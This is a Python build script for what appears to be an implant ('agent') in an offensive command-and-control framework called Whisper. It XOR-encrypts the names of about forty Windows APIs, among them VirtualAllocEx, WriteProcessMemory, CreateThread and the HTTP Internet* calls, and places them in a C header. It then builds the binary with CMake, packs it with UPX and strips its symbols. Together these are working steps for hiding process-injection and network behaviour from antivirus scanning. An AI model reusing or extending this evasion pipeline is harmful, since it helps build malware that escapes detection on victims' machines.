#!/usr/bin/env python3
"""
configure.py

Build script for agent-specific binaries.

This script runs pre-compilation, compilation, and post-compilation steps,
including XOR-based obfuscation, CMake build, UPX compression, and symbol stripping.

Note: The compiled binaries get copied to project_root/data/compiled AFTER this script is run. All
editing/modification of binaries is done in the build dir, which is handled/created by the server.
"""

import os
import random
import subprocess
import uuid
import shutil
import logging
from pathlib import Path

# Configure root logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("BUILD_LOGGER")


class PreCompile:
    """
    Pre-compilation actions for the build process, such as XOR-based macro replacements.
    """

    def __init__(self, base_build_path: Path):
        """
        :param base_build_path: Path to the root of the agent source tree.
        """
        self.base_build_path = Path(base_build_path)
        self.config_file = self.base_build_path / "whisper_config.h"

    def run(self) -> None:
        """
        Execute all pre-compilation steps.
        """
        logger.info(f"Starting pre-compilation for {self.base_build_path}")
        self._xor_replace_function_names()

    def _xor_replace_function_names(self) -> None:
        """
        Perform XOR-based macro replacements in the whisper_config.h header file.
        """
        logger.info("Performing XOR replacements in whisper_config.h")

        function_names = [
            "MessageBoxA",
            "CreateThread",
            "CreateProcessA",
            "ResumeThread",
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreatePipe",
            "SetHandleInformation",
            "CloseHandle",
            "InternetOpenA",
            "InternetConnectA",
            "HttpOpenRequestA",
            "HttpSendRequestA",
            "InternetOpenUrlW",
            "InternetReadFile",
            "InternetCloseHandle",
            "GetUserNameW",
            "Sleep",
            "WaitForSingleObject",
            "ReadFile",
            "OpenProcess",
            "TerminateProcess",
            "SuspendThread",
            "FormatMessageA",
            "CreateToolhelp32Snapshot",
            "Process32First",
            "Process32Next",
            "GetFileSize",
            "DeleteFileA",
            "WriteFile",
            "MoveFileA",
            "CopyFileA",
            "FindFirstFileW",
            "FindNextFileW",
            "FindClose",
            "SetCurrentDirectoryA",
            "CreateDirectoryA",
            "RemoveDirectoryA",
            "GetCurrentDirectoryA",
            "CreateFileA",
        ]
        xor_key = self._generate_xor_key()
        replacements = {"MACRO_FUNC_ENCRYPTED_NAME_KEY": f"0x{xor_key.hex().upper()}"}

        for func in function_names:
            array = self._obfuscate_to_c_array(func, xor_key)
            replacements[f"MACRO_FUNC_{func}_ENCRYPTED_NAME"] = array
            logger.debug(f"Prepared replacement for {func}: {array}")

        if not self.config_file.exists():
            logger.warning(f"Config file not found: {self.config_file}")
            return

        try:
            content = self.config_file.read_text(encoding="utf-8")
            modified = content
            for macro, val in replacements.items():
                if macro in modified:
                    modified = modified.replace(macro, val)
                    logger.debug(f"Replaced {macro} with {val}")
                else:
                    logger.warning(f"Macro {macro} not found in file")

            if modified != content:
                self.config_file.write_text(modified, encoding="utf-8")
                logger.info(f"Updated {self.config_file}")
            else:
                logger.info("No macros replaced; file unchanged")
        except Exception as e:
            logger.error(f"Error updating config file: {e}")

    @staticmethod
    def _obfuscate_to_c_array(input_string: str, key: bytes) -> str:
        """
        XOR-obfuscate a string and return it as a C-style hex array.

        :param input_string: Original function name.
        :param key: Single-byte XOR key.
        :return: C-style hex array with null terminator.
        """
        key_byte = key[0]
        data = input_string.encode("utf-8")
        obf = [f"0x{b ^ key_byte:02X}" for b in data] + ["0x00"]
        return "{ " + ", ".join(obf) + " };"

    @staticmethod
    def _generate_xor_key() -> bytes:
        """
        Generate a non-zero single-byte XOR key.
        """
        while (k := os.urandom(1)) == b"\x00":
            continue
        return k


class Compiler:
    """
    Compilation step invoking CMake.
    """

    def __init__(self, base_build_path: Path, build_id: str):
        """
        :param base_build_path: Path to the project source root.
        :param build_id: Unique build identifier (UUID).
        """
        self.base_build_path = Path(base_build_path)
        self.build_id = build_id
        self.build_dir = self.base_build_path / "build"
        self.bin_dir = self.build_dir / "bin"

    def run(self) -> None:
        """
        Execute the CMake configuration and build.
        """
        logger.info("Starting compilation")
        try:
            subprocess.run(
                ["cmake", "-S", str(self.base_build_path), "-B", str(self.build_dir)],
                check=True,
            )
            subprocess.run(
                ["cmake", "--build", str(self.build_dir)],
                check=True,
            )
            logger.info(f"Compilation completed for build {self.build_id}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Compilation failed: {e}")
            raise


class PostCompile:
    """
    Post-compilation actions such as UPX compression and symbol stripping.
    """

    def __init__(self, base_build_path: Path, binary_name: str):
        """
        :param base_build_path: Path to the project source root.
        :param binary_name: Base name of the generated binary (without extension).
        """
        self.bin_dir = Path(base_build_path) / "build" / "bin"
        self.binary_name = binary_name

    def run(self) -> None:
        """
        Execute UPX compression and strip symbols.
        """
        logger.info("Running post-compilation steps")
        self._compress_with_upx()
        self._strip_symbols()

    def _find_binary(self) -> Path | None:
        """
        Locate the built binary file in the bin directory.
        """
        candidates = list(self.bin_dir.glob(f"{self.binary_name}*"))
        if not candidates:
            logger.error(f"No binaries found matching '{self.binary_name}*'")
            return None
        if len(candidates) > 1:
            logger.warning("Multiple binaries found; using first match")
        return candidates[0]

    def _compress_with_upx(self) -> None:
        """
        Compress the binary using UPX if available.
        """
        if shutil.which("upx") is None:
            logger.warning("UPX not found; skipping compression")
            return
        binary = self._find_binary()
        if not binary:
            return
        try:
            subprocess.run(["upx", "--best", str(binary)], check=True)
            logger.info(f"Compressed {binary.name} with UPX")
        except subprocess.CalledProcessError as e:
            logger.error(f"UPX compression failed: {e}")

    def _strip_symbols(self) -> None:
        """
        Strip symbols from the binary using strip or a PE-aware strip tool.
        """
        strip_tool = shutil.which("x86_64-w64-mingw32-strip") or shutil.which("strip")
        if not strip_tool:
            logger.warning("No strip tool found; skipping symbol stripping")
            return
        binary = self._find_binary()
        if not binary:
            return
        if binary.suffix.lower() == ".exe" and "mingw32-strip" not in strip_tool:
            logger.info(f"Skipping strip on PE executable: {binary.name}")
            return
        try:
            subprocess.run([strip_tool, str(binary)], check=True)
            logger.info(f"Stripped symbols from {binary.name}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Strip failed: {e}")


def log_banner(message: str) -> None:
    """
    Print a banner in the logs.
    """
    logger.info("=" * 50)
    logger.info(message)
    logger.info("=" * 50)


def run(base_build_path: str, binary_name: str) -> None:
    """
    Entry point for the build script.

    :param base_build_path: Path to the project source root.
    :param binary_name: Base name of the generated binary (without extension).
    """
    log_banner("Whisper Build Script")

    base_path = Path(base_build_path)
    build_id = str(uuid.uuid4())

    # PreCompile
    pre = PreCompile(base_path)
    pre.run()

    # Compile
    compiler = Compiler(base_path, build_id)
    compiler.run()

    # PostCompile
    post = PostCompile(base_path, binary_name)
    post.run()
